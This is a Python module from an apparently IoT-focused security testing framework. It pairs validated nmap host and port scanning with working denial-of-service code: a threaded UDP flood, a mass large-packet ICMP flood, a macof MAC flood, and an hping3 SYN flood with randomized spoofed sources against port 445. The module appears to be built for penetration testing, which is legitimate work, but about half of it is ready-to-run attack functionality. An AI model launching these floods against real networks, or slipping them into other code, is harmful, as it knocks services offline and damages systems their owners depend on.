from __future__ import annotations

import ipaddress
import logging
import random
import socket
import subprocess
import threading
import xml.etree.ElementTree as ET
from collections.abc import Callable, Sequence
from typing import Any

from iotsploit_core.core.tool_manager import PathResolver
from iotsploit_core.utils.helpers import process_group_kwargs, terminate_process_group


logger = logging.getLogger(__name__)

MAX_SCAN_HOST_ENTRIES = 256
MAX_SCAN_NETWORK_ADDRESSES = 65_536


def validate_ipv4_hosts(hosts: Sequence[str]) -> list[str]:
    if isinstance(hosts, (str, bytes)) or not isinstance(hosts, Sequence):
        raise ValueError("hosts must be a sequence of IPv4 hosts or CIDRs")
    if not hosts:
        raise ValueError("at least one host is required")
    if len(hosts) > MAX_SCAN_HOST_ENTRIES:
        raise ValueError(f"at most {MAX_SCAN_HOST_ENTRIES} host entries are allowed")

    validated: list[str] = []
    for value in hosts:
        if not isinstance(value, str) or not value.strip():
            raise ValueError("each host must be a non-empty string")
        text = value.strip()
        try:
            network = ipaddress.ip_network(text, strict=False)
        except ValueError as exc:
            raise ValueError(f"invalid IPv4 host or CIDR: {text}") from exc
        if network.version != 4:
            raise ValueError(f"IPv6 host is not supported: {text}")
        if network.num_addresses > MAX_SCAN_NETWORK_ADDRESSES:
            raise ValueError(f"network is larger than /16: {text}")
        validated.append(text)
    return validated


def validate_port_spec(ports: str | Sequence[int]) -> str:
    if isinstance(ports, str):
        tokens = [token.strip() for token in ports.split(",") if token.strip()]
    elif isinstance(ports, Sequence) and not isinstance(ports, (str, bytes)):
        tokens = [str(port) for port in ports]
    else:
        raise ValueError("ports must be a comma-separated string or integer sequence")
    if not tokens:
        raise ValueError("at least one port is required")

    for token in tokens:
        bounds = token.split("-", 1)
        if len(bounds) == 1:
            bounds.append(bounds[0])
        try:
            start, end = (int(bound) for bound in bounds)
        except ValueError as exc:
            raise ValueError(f"invalid port specification: {token}") from exc
        if not 1 <= start <= end <= 65_535:
            raise ValueError(f"port is outside 1-65535: {token}")
    return ",".join(tokens)


def _ipv4_address(value: str) -> str:
    try:
        address = ipaddress.ip_address(value)
    except ValueError as exc:
        raise ValueError(f"invalid IPv4 address: {value}") from exc
    if address.version != 4:
        raise ValueError(f"IPv6 address is not supported: {value}")
    return str(address)


def _interface(value: str) -> str:
    if not isinstance(value, str) or not value or len(value) > 15:
        raise ValueError("interface must contain 1-15 characters")
    if any(character not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-" for character in value):
        raise ValueError(f"invalid interface: {value}")
    return value


class _UDPFloodThread(threading.Thread):
    def __init__(self, ip: str, port: int, size: int):
        super().__init__(daemon=True)
        self.ip = ip
        self.port = port
        self.buffer = b"\xAA" * size
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.running = True

    def run(self) -> None:
        while self.running:
            port = random.randint(1, 65_535) if self.port == 0 else self.port
            self.sock.sendto(self.buffer, (self.ip, port))
        self.sock.close()

    def stop(self) -> None:
        self.running = False


class NetAudit_Mgr:
    @staticmethod
    def Instance():
        return _instance

    def __init__(
        self,
        *,
        run: Callable[..., Any] | None = None,
        popen: Callable[..., Any] | None = None,
        resolve_binary: Callable[[str], str | None] | None = None,
    ) -> None:
        self._run = run or subprocess.run
        self._popen = popen or subprocess.Popen
        self._resolve_binary = resolve_binary or PathResolver().resolve_tool_path
        self._jobs: dict[str, list[Any]] = {}

    def _tool(self, name: str) -> str:
        executable = self._resolve_binary(name)
        if not executable:
            raise RuntimeError(f"Required tool is unavailable: {name}")
        return executable

    def _run_command(self, argv: list[str], *, timeout: float = 120) -> subprocess.CompletedProcess[str]:
        return self._run(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            close_fds=True,
        )

    def _start_job(self, name: str, argv: list[str]) -> Any:
        process = self._popen(
            argv,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            **process_group_kwargs(),
        )
        self._jobs.setdefault(name, []).append(process)
        return process

    def _stop_jobs(self, name: str) -> int:
        processes = self._jobs.pop(name, [])
        for process in processes:
            if process.poll() is None:
                terminate_process_group(process)
        for process in processes:
            if process.poll() is None:
                try:
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait(timeout=1)
        return 1 if processes else -1

    def ip_detect(self, host_list: Sequence[str]):
        hosts = validate_ipv4_hosts(host_list)
        argv = [self._tool("nmap"), "-sn", "--privileged", *hosts]
        result = self._run_command(argv)
        if result.returncode != 0:
            raise RuntimeError(f"nmap host discovery failed: {(result.stderr or '').strip()}")

        discovered = []
        for line in (result.stdout or "").splitlines():
            if line.startswith("Nmap scan report for "):
                discovered.append(line.removeprefix("Nmap scan report for "))
        return discovered

    def port_detect(self, host_list: Sequence[str], port_list: str | Sequence[int]):
        hosts = validate_ipv4_hosts(host_list)
        ports = validate_port_spec(port_list)
        argv = [self._tool("nmap"), "-vv", "-sT", "-T2", "-p", ports, *hosts, "-oX", "-"]
        result = self._run_command(argv)
        if result.returncode != 0:
            logger.error("nmap port scan failed: %s", (result.stderr or "").strip())
            return None

        try:
            root = ET.fromstring(result.stdout)
        except ET.ParseError:
            logger.exception("nmap returned invalid XML")
            return None

        discovered = []
        for host in root.iter("host"):
            address = host.find("address")
            if address is None:
                continue
            for port in host.iter("port"):
                state = port.find("state")
                if state is not None and state.attrib.get("state") == "open":
                    discovered.append({"ip": address.attrib["addr"], "port": port.attrib["portid"]})
        return discovered

    def read_route(self):
        result = self._run_command([self._tool("ip"), "route", "show"], timeout=10)
        return result.stdout if result.returncode == 0 else None

    def start_mac_flood_attack(self, target_ip: str, interface_name: str = "wlan0"):
        self.stop_mac_flood_attack()
        self._start_job(
            "mac",
            [self._tool("macof"), "-i", _interface(interface_name), "-d", _ipv4_address(target_ip)],
        )
        return 1

    def stop_mac_flood_attack(self):
        return self._stop_jobs("mac")

    def start_icmp_flood_attack(self, target_ip: str):
        self.stop_icmp_flood_attack()
        target = _ipv4_address(target_ip)
        for _ in range(100):
            self._start_job("icmp", [self._tool("ping"), target, "-s", "65500"])
        return 1

    def stop_icmp_flood_attack(self):
        return self._stop_jobs("icmp")

    def start_udp_flood_attack(self, target_ip: str, target_port: int = 0, buffer_size: int = 128):
        self.stop_udp_flood_attack()
        target = _ipv4_address(target_ip)
        port = int(target_port)
        size = int(buffer_size)
        if not 0 <= port <= 65_535:
            raise ValueError("target_port must be between 0 and 65535")
        if not 1 <= size <= 65_507:
            raise ValueError("buffer_size must be between 1 and 65507")
        threads = [_UDPFloodThread(target, port, size) for _ in range(100)]
        self._jobs["udp"] = threads
        for thread in threads:
            thread.start()
        return 1

    def stop_udp_flood_attack(self):
        threads = self._jobs.pop("udp", [])
        for thread in threads:
            thread.stop()
        for thread in threads:
            thread.join()
        return 1 if threads else -1

    def start_tcp_flood_attack(self, target_ip: str):
        self.stop_tcp_flood_attack()
        self._start_job(
            "tcp",
            [
                self._tool("hping3"),
                "-V",
                "-d",
                "120",
                "-S",
                "-w",
                "64",
                "-p",
                "445",
                "-s",
                "445",
                "--flood",
                "--rand-source",
                _ipv4_address(target_ip),
            ],
        )
        return 1

    def stop_tcp_flood_attack(self):
        return self._stop_jobs("tcp")


_instance = NetAudit_Mgr()
